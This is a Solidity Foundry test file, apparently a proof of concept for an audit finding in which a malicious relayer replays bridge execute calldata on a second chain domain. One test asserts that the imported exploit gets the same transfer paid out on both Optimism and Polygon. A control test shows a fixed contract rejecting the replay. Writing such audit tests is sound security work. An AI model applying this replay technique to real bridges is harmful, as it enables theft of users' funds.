// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Erc20,
    TokenRegistry,
    BridgeFacetFixed,
    ExecuteArgs,
    CallParams
} from "./25135-h-06-malicious-relayer-can-replay-execute-calldata-on-differ.sol";

contract PoC_25135_CrossDomainExecuteReplay is Test {
    uint256 internal constant AMOUNT = 1000 ether;
    address internal constant O_USDC = address(0x111111111111111111111111111111111111000a);
    address internal constant POS_USDC = address(0x111111111111111111111111111111111111000B);

    function test_same_transfer_pays_both_domains() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.usdc().balanceOf(address(exp)), 2000 ether, "both domains paid");
        assertEq(exp.optimism().paidOut(), AMOUNT, "optimism");
        assertEq(exp.polygon().paidOut(), AMOUNT, "polygon");
        assertEq(exp.polygon().seenDomain(), 137, "polygon domain ignored");
    }

    function test_control_domain_check_pays_only_destination() public {
        Erc20 usdc = new Erc20("USDC");
        TokenRegistry registry = new TokenRegistry();
        BridgeFacetFixed optimism = new BridgeFacetFixed(registry, usdc, 10);
        BridgeFacetFixed polygon = new BridgeFacetFixed(registry, usdc, 137);
        registry.register(O_USDC);
        registry.register(POS_USDC);
        usdc.mint(address(optimism), AMOUNT);
        usdc.mint(address(polygon), AMOUNT);

        ExecuteArgs memory args = ExecuteArgs({
            params: CallParams({destinationDomain: 10, recipient: address(this), pathLength: 1}),
            local: O_USDC,
            routers: new address[](1),
            routerSignatures: new bytes32[](1),
            amount: AMOUNT,
            nonce: 7,
            originSender: address(this)
        });
        (uint32 tokenDomain, bytes32 tokenId) = registry.getTokenId(args.local);
        args.routerSignatures[0] = keccak256(
            abi.encode(
                args.params.destinationDomain,
                args.params.recipient,
                args.params.pathLength,
                args.amount,
                args.nonce,
                tokenId,
                tokenDomain,
                args.originSender
            )
        );

        optimism.execute(args);
        args.local = POS_USDC;
        bool reverted;
        try polygon.execute(args) {
            reverted = false;
        } catch {
            reverted = true;
        }

        assertTrue(reverted, "polygon must reject");
        assertEq(usdc.balanceOf(address(this)), AMOUNT, "only the destination domain pays");
        assertEq(polygon.paidOut(), 0, "polygon unpaid");
    }
}
